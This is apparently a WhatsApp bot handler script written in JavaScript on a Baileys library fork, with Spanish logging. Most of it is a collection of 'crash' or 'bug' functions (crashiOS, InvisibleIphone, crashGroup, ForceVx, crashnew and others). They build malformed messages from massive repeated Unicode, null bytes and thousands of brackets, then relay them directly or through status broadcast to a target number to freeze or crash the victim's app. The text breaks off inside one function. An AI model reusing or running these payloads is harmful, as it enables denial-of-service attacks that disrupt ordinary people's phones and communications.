const {
          generateWAMessageFromContent,
          getAggregateVotesInPollMessage,
          downloadContentFromMessage,
          prepareWAMessageMedia,
          useMultiFileAuthState,
          generateMessageID,
          generateIOSMessageID,
          generateWAMessage,
          makeInMemoryStore,
          DisconnectReason,
          areJidsSameUser,
          getContentType,
          decryptPollVote,
          relayMessage,
          jidDecode,
          Browsers,
          getDevice,
          proto,
          } = require("baron-baileys-v2")
const fs = require('fs')
//const 
const web = fs.readFileSync('./src/opa.webp');
const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(1000);
const util = require('util')
const chalk = require('chalk')
const fetch = require('node-fetch')
const moment = require('moment-timezone');
const pino = require('pino')
const logger = pino({ level: 'debug' });
const crypto = require('crypto');
messageSecret: crypto.randomBytes(32)

const path = require('path')


const { trimEnd } = require("lodash")

module.exports = async (conn, m, chatUpdate, store,wa) => {
try {
m.id = m.key.id
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.isGroup = m.chat?.endsWith('@g.us') || false
m.sender = conn.decodeJid(m.fromMe && conn.user. id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || ''
function getTypeM(message) {
    const type = Object.keys(message)
    var restype =  (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || type[type.length - 1] || Object.keys(message)[0]
	return restype
}
m.mtype = getTypeM(m.message)
m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype])
m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || ''
const info = m
const from = info.key.remoteJid
const from2 = info.chat
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const getGroupAdmins = (participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var budy = (typeof m.text == 'string' ? m.text: '')
const bardy = body || '';
const isCmd = bardy.startsWith(prefix);
const command = isCmd ? bardy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = bardy.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = info.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (info.key.participant || info.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)
const senderNumber = sender.split('@')[0]

const userList = [
"yournumber@s.whatsapp.net",
"friendsnumber@s.whatsapp.net",
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net",
"593969533280@s.whatsapp.net",
"584163679167@s.whatsapp.net"
];
const candList = [
    "5216421147692@s.whatsapp.net", 
    "yournumber@s.whatsapp.net",
    "friendsnumber@s.whatsapp.net",
    "120363421317937545@g.us",
    "13135550002@s.whatsapp.net",
    "593969533280@s.whatsapp.net",
    "584163679167@s.whatsapp.net",
    "5491130524256@s.whatsapp.net"
];
const groupid = [ 
 "120363421317937545@g.us",
 "120363415442586508@g.us",
 "120363421386564277@g.us",
 "120363420474631547@g.us",
 "120363402299771381@g.us",
 ];
global.prefa = ['','!','.',',','/','-'] 
const isNose = groupid.includes(sender);
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = info.key.fromMe ? true : false
const sJid = "status@broadcast";
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata?.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var deviceC = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
const settingsPath = './dev/setting.js';
const settings = require(settingsPath);
global.totallog = settings.totallog
global.logColor = settings.logColor || "\x1b[31m"
global.shapeColor = settings.shapeColor || "\x1b[31m"
global.rootColor = settings.rootColor || "\x1b[31m"
global.hideNumber = settings.hideNumber || false
function log(messageLines, title) {
    const top = `\n${shapeColor}` + "╭" + "─".repeat(50) + "╮" + "\x1b[0m"
    const bottom = `${shapeColor}╰` + "─".repeat(50) + "╯" + "\x1b[0m"
    const emptyLine = `${shapeColor}│` + " ".repeat(50) + "│" + "\x1b[0m"
    

    console.log(top);
    if (title) {
    const strip = title.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
    const titleLine = `${shapeColor}│` + " " + `${logColor}` +
    strip.padEnd(48) + " " + `${shapeColor}│`
    console.log(titleLine);
    console.log(emptyLine);
    }
    messageLines.forEach((line, i)=> {
    if (line.startsWith("\x1b")) {
        const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(51)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
    } else {
    const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(46)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
        }
        
    });
    console.log(emptyLine);
    console.log(bottom + "\n\n");
}
function hidden(input) {
if (hideNumber){
return "*************"
} else {
return input
}
}
if (totallog) {
if (m.message && m.isGroup) {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Grupal';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Mensaje: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> de: ${hidden(info.sender)}`,
        `=> en: ${groupName || info.chat}`,
        `=> Dispositivo: ${deviceC}`,
    ];
    log(INFOS, title);
} else {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Privado';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Texto: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> De: ${hidden(info.sender)}`,
        `=> Dispocitivo: ${deviceC}`,
    ];
    log(INFOS, title);
}
}
const reply = (text) => {
conn.sendMessage(from, { text: text, mentions: [sender]},
{quoted: info}
).catch(e => {
return
})
}


let mediaImage = await prepareWAMessageMedia({ 
    "image": {
       "url": "./media/thumb.jpg"
      }
    },
  { "upload": conn.waUploadToServer}
  )
mediaImage = mediaImage.imageMessage

const Ehztext = (text, style = 1) => {
    var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
    var ehz = {
      1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
    };
    var replacer = [];
    abc.map((v, i) =>
      replacer.push({
        original: v,
        convert: ehz[style].split('')[i]
      })
    );
    var str = text.toLowerCase().split('');
    var output = [];
    str.map((v) => {
      const find = replacer.find((x) => x.original == v);
      find ? output.push(find.convert) : output.push(v);
    });
    return output.join('');
  };

  function sendMessageWithMentions(text, mentions = [], quoted = false) {
    if (quoted == null || quoted == undefined || quoted == false) {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    } else {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    }
  }


      conn.sendjsonv3 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid,
          }) 
         
       return conn.relayMessage(jid, etc.message, { messageId: etc.key.id });
       }
  
       conn.sendjsonv4 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid }) 
         
       return conn.relayMessage(jid, etc.message, { participant: { jid: jid },   messageId: etc.key.id });
       }
const cataui = fs.readFileSync("./src/cataui.js", "utf8");


async function crashiOS(target) {
 await conn.sendMessage(target, {
 text:
 "BOOT FREE" +
 "𑇂𑆵𑆴𑆿".repeat(60000),
 contextInfo: {
 externalAdReply: {
 title: `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>`,
 body: `BOOT FREE`,
 previewType: "PHOTO",
 thumbnail: fs.readFileSync("./media/ola.jpg"),
 sourceUrl: ``
 }
 }
 }, { quoted: m });
}
const webozz = {
key: {
remoteJid: "status@broadcast",
fromMe: false,
participant: `0@s.whatsapp.net`,
id: "3EB0"
},
message: {
extendedTextMessage: {
text: `ＵＮＫ ↯ ＢＯＴＺＩＮ`,
contextInfo: {
stanzaId: "3EB0",
}
}
}
};

const choco = {
  key: {
    fromMe: false,
    remoteJid: "status@broadcast",
    participant: "0@s.whatsapp.net"
  },
  message: {
    contactMessage: {
      displayName: "⿻𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦⿻",
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:ZETAS COLLAB\nTEL;type=CELL;type=VOICE;waid=593969533280:593969533280\nEND:VCARD`
    }
  }
}
async function mikirKidz(conn, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await conn.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG ✅✅");
  } catch (err) {
    console.error(calik.red.bold(err));
  }
}
async function crashGroup(target) {
let msg = generateWAMessageFromContent(target, {
  interactiveMessage: {
    contextInfo: {
      isForwarded: true, 
      forwardingScore: 1972,
      businessMessageForwardInfo: {
        businessOwnerJid: "13135550002@s.whatsapp.net"
      }
    }, 
    header: {
      jpegThumbnail: `7eppImg`, 
      hasMediaAttachment: true, 
      title: "D | 7eppeli-Exploration"
    }, 
    nativeFlowMessage: {
      buttons: [
        {
          name: "review_and_pay",
          buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
        }
      ],
      messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
    }, 
  }
}, { userJid:target });
  
  await conn.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

async function SqlCaraosel(conn, jid) {
  const msg = {
    viewOnceMessage: {
      message: {
        carouselMessage: {
          cards: [
            {
              header: {
                title: "Sql Caraosel¿",
                subtitle: "#PorExport",
                hasMediaAttachment: true,
              },
              body: { text: "Sql Caraosel¿" },
            },
          ],
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                status: true,
                buttonParamsJson: "{}",
              }),
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "[".repeat(7000),
          version: 3,
        },
      },
    },
  };

  await conn.relayMessage(jid, msg, {
    messageId: generateMessageID(),   // ✅ cambio aquí
    participant: { jid },
    messageTimestamp: Date.now(),
  });
}
async function InvisibleIphone(conn, target) {
const ameliakill = "AMELIA MODDERS" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "AMELIA MODDERS" + ameliakill,
            matchedText: "AMELIA MODDERS",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "AMELIA MODDERS" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await conn.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await conn.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await conn.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.red(`SEND BUG TERKIRIM ${target}`));
   } catch (err) {
      console.error(err);
   }
};
async function handleStatusBox(conn, msg) {
  const text =
    msg.message?.conversation ||
    msg.message?.extendedTextMessage?.text ||
    msg.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
    "";

  // separar comando y número
  const args = text.trim().split(/\s+/);
  const number = args[1]; // lo que viene después de "statusbox"

  if (!number) {
    await conn.sendMessage(msg.key.remoteJid, { text: "❌ Error: Debes ingresar un número." }, { quoted: msg });
    return;
  }

  try {
    // verificar en WhatsApp
    const [result] = await conn.onWhatsApp(number);

    if (!result) {
      await sock.sendMessage(msg.key.remoteJid, { text: `❌ El número ${number} no está en WhatsApp.` }, { quoted: msg });
      return;
    }

    const data = {
      Number: number,
      Status: result.exists ? "activo" : "no existe",
      Jid: result.jid
    };

    await sock.sendMessage(msg.key.remoteJid, { text: JSON.stringify(data, null, 2) }, { quoted: msg });

  } catch (e) {
    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Error: ${e.message}` }, { quoted: msg });
  }
}
async function HvXc4(conn, target) {
 let msg = generateWAMessageFromContent(target, proto.Message.fromObject({
  viewOnceMessage: {
   message: {
    interactiveMessage: {
     header: {
      title: "",
      subtitle: "#Expoluvetion",
      jpegThumbnail: web, // bisa link
      hasMediaAttachment: true,
     },
     body: { text: "x" },
     nativeFlowMessage: {
      messageParamsJson: `{`.repeat(10000),
      version: 3,
      buttons: [{
        name: "single_select",
        buttonParamsJson: JSON.stringify({
         status: true,
         buttonParamsJson: `\u0000`
        })
       },{
        name: "view_cart",
        buttonParamsJson: 
`{"cart_id":"pyn_xiv","items":[{"product_id":".id","title":"dy!x","description":"${"ោ៝".repeat(5000)}","quantity":1,"price":9999}],"total_price":999999,"currency":"IDR"}`
       }
      ],
      contextInfo: {
       participant: target,
       mentionedJid: [
        "0@s.whatsapp.net",
        ...Array.from({ length: 500 }, () =>
         "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
        )]
      }
     },
     messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      readReceipt: [{
        userJid: "628987654321@s.whatsapp.net",
        timestamp: 1693912350
       }]
     }
    }}
  }
 }), { quoted: null });

 await conn.relayMessage(target, msg.message, {
  messageId: conn.generateMessageTag(),
  participant: { jid: target },
  messageTimestamp: Math.floor(Date.now() / 1000),
 });
}
async function ForceVx(target) {
 let msg = proto.Message.fromObject({
  viewOnceMessage: {
   message: {
    interactiveMessage: {
     contextInfo: {
      isForwarded: true,
      forwardingScore: 1972,
      businessMessageForwardInfo: {
       businessOwnerJid: "13135550002@s.whatsapp.net"
      }
     },
     header: {
      title: "🦄드림dy!x드림🦄",
      subtitle: "#>Exocentrus!",
      hasMediaAttachment: true
     },
     body: { text: "null" },
     carouselMessage: {
      cards: [{
        nativeFlowMessage: {
         messageParamsJson: "{".repeat(10000)
        }
       }
      ],
      version: 3
     }
    }
   }
  },
  userJid: target  
 });

 await conn.relayMessage(target, msg.message, {
  messageId: msg.key.id,
  participant: { jid: target }
 });
}
async function crashnew(target) {
  const payload = {
    contextInfo: {
      mentionedJid: [undefined, null],
      forwardingScore: -9999,
      isForwarded: true,
      participant: null,
      remoteJid: undefined,
      quotedMessage: {
        conversation: "\u0000".repeat(90000)
      }
    }
  }
  await conn.relayMessage(target, {
    albumMessage: {
      caption: " ─ permission Emperorz. ",
      mediaCount: -99999999,
      firstMedia: {},
      contextInfo: payload.contextInfo
    }
  }, { messageId: "alb_" + Date.now(), participant: null });
  await conn.relayMessage(target, {
    contactMessage: {
      displayName: "\u0000".repeat(10000),
      vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:\nTEL;waid= //isi sendiri:\nEND:VCARD",
      contextInfo: payload.contextInfo
    }
  }, { messageId: "ctc_" + Date.now(), participant: null });
  await conn.relayMessage(target, {
    nativeFlowMessage: {
      buttons: [],
      messageParamsJson: "{[(".repeat(10000),
      flowToken: "",
      content: {
        namespace: "",
        locale: "",
        fallbackLg: "",
        fallbackLc: "",
        title: "permission Emperorz.",
        description: "\u0000".repeat(10000),
        buttonText: "\u0000".repeat(10000),
      },
      contextInfo: payload.contextInfo
    }
  }, { messageId: "flw_" + Date.now(), participant: null });
  await conn.relayMessage(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          caption: " ─ permission Emperorz. ",
          jpegThumbnail: Buffer.alloc(1),
          contextInfo: payload.contextInfo
        }
      }
    }
  }, { messageId: "vom_" + Date.now(), participant: null });
  await conn.sendMessage(target, {
    text: "",
    contextInfo: payload.contextInfo
  });
  }
async function docthumb(conn, target) {
  const PraiX = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⎋ㄗ𖦪𖤬ꛈ𖣠ꘘꘘꛈꛕꛈ𖤬ꚳ 𖤗 𖢧ꛉꚲ𞋯 -‣" + "\u0000".repeat(7500) + "꧀".repeat(55000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
